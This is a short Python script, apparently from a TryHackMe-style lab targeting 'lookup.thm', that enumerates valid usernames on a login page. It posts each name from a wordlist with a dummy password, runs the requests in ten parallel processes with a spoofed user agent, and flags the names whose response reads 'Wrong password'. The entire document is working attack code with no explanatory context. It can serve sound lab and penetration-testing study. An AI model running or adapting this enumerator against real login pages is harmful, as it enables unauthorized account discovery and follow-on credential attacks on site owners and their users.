import requests  # Library for sending HTTP requests
import multiprocessing  # Library for parallel execution

# Define the target URL (changed to HTTP based on the Nmap scan)
target = 'http://lookup.thm/login.php'  

# Path to the wordlist containing possible usernames
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

# Custom headers to mimic a real browser request
headers = {"User-Agent": "Mozilla/5.0"}  

# Function to check if a username exists on the login page
def user_check(name):
    try:
        data = {"username": name, "password": "password"}  # Send a test password
        response = requests.post(target, data=data, headers=headers, timeout=5)  # POST request

        # If the response contains "Wrong password", it means the username exists
        if "Wrong password" in response.text:
            print(f"User found: {name}")  

    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")  # Handles network errors (e.g., connection refused)

try:
    # Open the username wordlist and read all usernames
    with open(username_file, 'r') as user_file:
        users = [user.strip() for user in user_file]  # Strip newlines/spaces

    # Use multiprocessing to test multiple usernames in parallel
    with multiprocessing.Pool(processes=10) as pool:
        pool.map(user_check, users)  # Run user_check() for each username

except FileNotFoundError:
    print(f'Error: File path {username_file} does not exist')  # Handle missing file error
